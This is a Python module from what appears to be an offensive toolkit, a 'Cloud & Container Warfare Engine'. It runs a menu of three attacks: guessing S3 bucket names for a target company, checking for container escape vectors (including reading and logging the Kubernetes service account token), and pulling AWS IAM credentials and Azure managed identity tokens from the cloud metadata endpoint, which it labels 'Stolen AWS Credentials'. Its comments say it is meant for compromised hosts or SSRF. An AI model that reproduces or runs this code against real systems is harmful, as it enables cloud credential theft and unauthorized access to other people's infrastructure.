"""
modules/cloud_ops.py — Cloud & Container Warfare Engine
FIXES:
  - self.metadata_url was a broken markdown hyperlink string — replaced with
    a clean URL string: "http://169.254.169.254/latest/meta-data/"
"""

import os
import requests
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

from core.ui import draw_header, Q_STYLE
from core.database import db

console = Console()


class CloudEngine:
    def __init__(self):
        # AWS / Azure / GCP Instance Metadata Service endpoint
        # NOTE: previously this was a broken markdown hyperlink — now a plain URL
        self.metadata_url = "http://169.254.169.254/latest/meta-data/"

    # ─────────────────────────────────────────────────────────────────────────
    #  S3 BUCKET SNIPER
    # ─────────────────────────────────────────────────────────────────────────

    def hunt_s3_buckets(self):
        """Scans for exposed AWS S3 buckets using keyword permutations."""
        keyword = questionary.text(
            "Enter target company/keyword (e.g., 'acme'):", style=Q_STYLE).ask()
        if not keyword:
            return

        prefixes = ["dev", "prod", "test", "staging", "backup",
                    "logs", "internal", "public", "assets", "data"]
        suffixes = ["-dev", "-prod", "-backup",
                    "-logs", "-files", "-s3", "-bucket", ""]

        console.print(
            f"[*] Sniping exposed S3 buckets for keyword: [cyan]{keyword}[/cyan]")

        found = []
        for pref in prefixes:
            for suff in suffixes:
                bucket_names = [
                    f"{keyword}-{pref}{suff}",
                    f"{pref}-{keyword}{suff}",
                    f"{keyword}{suff}",
                ]
                for bucket in set(bucket_names):
                    url = f"https://{bucket}.s3.amazonaws.com"
                    try:
                        res = requests.get(url, timeout=2)
                        if res.status_code == 200:
                            console.print(
                                f"[bold green][+] PUBLIC BUCKET FOUND:[/bold green] {url}")
                            found.append(url)
                            db.log("Cloud-Ops", url,
                                   "Publicly readable AWS S3 Bucket", "HIGH")
                        elif res.status_code == 403:
                            console.print(
                                f"[yellow][~] Access Denied (bucket exists):[/yellow] {url}")
                    except requests.exceptions.RequestException:
                        pass

        if not found:
            console.print(
                "[dim]No public buckets found in this quick sweep.[/dim]")

    # ─────────────────────────────────────────────────────────────────────────
    #  CONTAINER BREAKOUT AUDIT
    # ─────────────────────────────────────────────────────────────────────────

    def container_breakout_check(self):
        """Checks if running inside Docker/K8s and looks for escape vectors."""
        table = Table(
            title="Local Container Environment Audit",
            border_style="cyan",
            expand=True,
        )
        table.add_column("Vector",  style="magenta")
        table.add_column("Status",  style="white")

        # 1. Docker environment file
        if os.path.exists("/.dockerenv"):
            table.add_row("Docker Environment",
                          "[bold red]Inside Docker Container[/bold red]")
        else:
            table.add_row("Docker Environment",
                          "[green]Not inside Docker[/green]")

        # 2. Kubernetes service account token
        k8s_token = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        if os.path.exists(k8s_token):
            table.add_row("K8s Service Token",
                          f"[bold red]FOUND ({k8s_token})[/bold red]")
            try:
                with open(k8s_token, "r") as f:
                    db.log("Cloud-Ops", "Localhost",
                           f"K8s Service Account Token: {f.read()[:80]}...",
                           "CRITICAL")
            except Exception:
                pass
        else:
            table.add_row("K8s Service Token", "[green]Not Found[/green]")

        # 3. Mounted Docker socket (full host takeover vector)
        if os.path.exists("/var/run/docker.sock"):
            table.add_row(
                "Mounted docker.sock",
                "[bold red]CRITICAL: Container Escape Possible[/bold red]")
            db.log("Cloud-Ops", "Localhost",
                   "docker.sock mounted — host root takeover possible", "CRITICAL")
        else:
            table.add_row("Mounted docker.sock", "[green]Safe[/green]")

        # 4. Privileged mode check (writable /proc/sysrq-trigger)
        if os.path.exists("/proc/sysrq-trigger"):
            try:
                with open("/proc/sysrq-trigger", "w") as _:
                    pass
                table.add_row("Privileged Mode",
                              "[bold red]Container appears privileged![/bold red]")
            except PermissionError:
                table.add_row("Privileged Mode",
                              "[green]Not privileged[/green]")
        else:
            table.add_row("Privileged Mode", "[green]N/A[/green]")

        console.print(table)

    # ─────────────────────────────────────────────────────────────────────────
    #  CLOUD IMDS EXTRACTION
    # ─────────────────────────────────────────────────────────────────────────

    def extract_cloud_metadata(self):
        """
        Attempts to extract AWS/Azure/GCP instance metadata.
        Run from a compromised cloud host, or via an SSRF vulnerability.
        """
        console.print(
            "[dim]Run FROM the compromised machine or via an SSRF vector.[/dim]")

        target = questionary.text(
            "Target IMDS URL (blank = use default 169.254.169.254):",
            style=Q_STYLE,
        ).ask()

        url = target.rstrip("/") + "/" if target else self.metadata_url

        console.print(
            f"[*] Probing IMDS at: [bold yellow]{url}[/bold yellow]")

        headers = {
            "X-aws-ec2-metadata-token-ttl-seconds": "21600",  # AWS IMDSv2
            "Metadata": "true",                                # Azure
        }

        try:
            # AWS: IAM role credentials
            res = requests.get(
                f"{url}iam/security-credentials/",
                headers=headers, timeout=3)
            if res.status_code == 200:
                role = res.text.strip()
                console.print(
                    f"[bold green][+] AWS IAM Role Found:[/bold green] {role}")
                creds = requests.get(
                    f"{url}iam/security-credentials/{role}",
                    headers=headers, timeout=3)
                if creds.status_code == 200:
                    console.print(
                        Panel(creds.text,
                              title="Stolen AWS Credentials",
                              border_style="red"))
                    db.log("Cloud-Ops", url,
                           f"Stolen AWS Keys for role {role}:\n{creds.text}",
                           "CRITICAL")
            else:
                console.print("[yellow][-] No AWS IAM roles exposed.[/yellow]")

            # Azure: managed identity token
            azure_url = "http://169.254.169.254/metadata/identity/oauth2/token"
            params = {
                "api-version": "2018-02-01",
                "resource":    "https://management.azure.com/",
            }
            az_res = requests.get(
                azure_url, headers={"Metadata": "true"},
                params=params, timeout=3)
            if az_res.status_code == 200:
                console.print(Panel(
                    az_res.text,
                    title="Azure Managed Identity Token",
                    border_style="red"))
                db.log("Cloud-Ops", azure_url,
                       f"Azure Identity Token: {az_res.text[:200]}",
                       "CRITICAL")
            else:
                console.print(
                    "[yellow][-] No Azure managed identity token found.[/yellow]")

        except requests.exceptions.RequestException:
            console.print(
                "[red][!] Could not reach metadata server. "
                "Target may not be a cloud instance, or IMDSv2 is blocking requests.[/red]")

    # ─────────────────────────────────────────────────────────────────────────
    #  MAIN MENU
    # ─────────────────────────────────────────────────────────────────────────

    def run(self):
        draw_header("Cloud & Container Warfare")

        while True:
            choice = questionary.select(
                "Select Cloud Operation:",
                choices=[
                    "1. S3 Bucket Sniper (External)",
                    "2. Local Container Breakout Audit (Docker/K8s)",
                    "3. Extract Cloud Instance Metadata (IAM / Azure / GCP)",
                    "Back",
                ],
                style=Q_STYLE,
            ).ask()

            if not choice or choice == "Back":
                break
            elif "S3" in choice:
                self.hunt_s3_buckets()
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            elif "Container" in choice:
                self.container_breakout_check()
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            elif "Metadata" in choice:
                self.extract_cloud_metadata()
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()


# ─────────────────────────────────────────────────────────────────────────────
#  ENTRY POINT — called by main.py
# ─────────────────────────────────────────────────────────────────────────────

def run_cloud_ops():
    CloudEngine().run()


if __name__ == "__main__":
    run_cloud_ops()
